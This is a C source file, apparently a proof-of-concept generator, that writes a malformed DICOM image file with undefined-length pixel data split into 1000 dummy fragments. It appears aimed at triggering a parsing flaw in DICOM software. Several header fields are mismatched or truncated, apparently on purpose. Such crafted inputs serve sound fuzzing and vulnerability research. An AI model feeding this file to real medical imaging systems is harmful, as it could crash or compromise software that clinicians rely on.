#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void w16(FILE *f, unsigned short v) {
    fputc(v & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
}

static void w32(FILE *f, unsigned int v) {
    fputc(v & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 24) & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Preamble
    for (int i = 0; i < 128; i++) fputc(0, f);
    fwrite("DICM", 1, 4, f);

    // Meta header - explicit VR
    // Group Length (0x0002,0x0000) VR=UL, len=4, val=84
    w16(f, 0x0002); w16(f, 0x0000);
    fwrite("UL", 1, 2, f); fputc(0, f); fputc(0, f);
    w32(f, 4); w32(f, 84);

    // SOP Class UID (0x0002,0x0002) VR=UI, len=26
    w16(f, 0x0002); w16(f, 0x0002);
    fwrite("UI", 1, 2, f); fputc(0, f); fputc(0, f);
    w32(f, 26);
    fwrite("1.2.840.10008.5.1.4.1.1.2", 1, 26, f);

    // SOP Instance UID (0x0002,0x0003) VR=UI, len=24
    w16(f, 0x0002); w16(f, 0x0003);
    fwrite("UI", 1, 2, f); fputc(0, f); fputc(0, f);
    w32(f, 24);
    fwrite("1.2.826.0.1.3680043.2.1", 1, 24, f);

    // Transfer Syntax UID (0x0002,0x0010) VR=UI, len=18 - Explicit VR Little Endian
    w16(f, 0x0002); w16(f, 0x0010);
    fwrite("UI", 1, 2, f); fputc(0, f); fputc(0, f);
    w32(f, 18);
    fwrite("1.2.840.10008.1.2.1", 1, 18, f);

    // Dataset - implicit VR
    // Columns (0x0028,0x0011) US, 100
    w16(f, 0x0028); w16(f, 0x0011); w32(f, 2); w16(f, 100);
    // Rows (0x0028,0x0010) US, 100
    w16(f, 0x0028); w16(f, 0x0010); w32(f, 2); w16(f, 100);
    // Bits Allocated (0x0028,0x0100) US, 8
    w16(f, 0x0028); w16(f, 0x0100); w32(f, 2); w16(f, 8);
    // Samples per Pixel (0x0028,0x0002) US, 1
    w16(f, 0x0028); w16(f, 0x0002); w32(f, 2); w16(f, 1);
    // Pixel Representation (0x0028,0x0103) US, 0
    w16(f, 0x0028); w16(f, 0x0103); w32(f, 2); w16(f, 0);

    // Pixel Data (0x7FE0,0x0010) with undefined length (0xFFFFFFFF)
    w16(f, 0x7FE0); w16(f, 0x0010); w32(f, 0xFFFFFFFF);

    // Write 1000 fragments: each has Item tag (0xFFFE,0xE000) with length 4
    for (int i = 0; i < 1000; i++) {
        w16(f, 0xFFFE); w16(f, 0xE000);
        w32(f, 4); // each fragment contains 4 bytes of dummy data
        fputc(0xFF, f); fputc(0xFF, f); fputc(0xFF, f); fputc(0xFF, f);
    }

    // Sequence Delimiter (0xFFFE,0xE0DD) length=0
    w16(f, 0xFFFE); w16(f, 0xE0DD); w32(f, 0);

    fclose(f);
    return 0;
}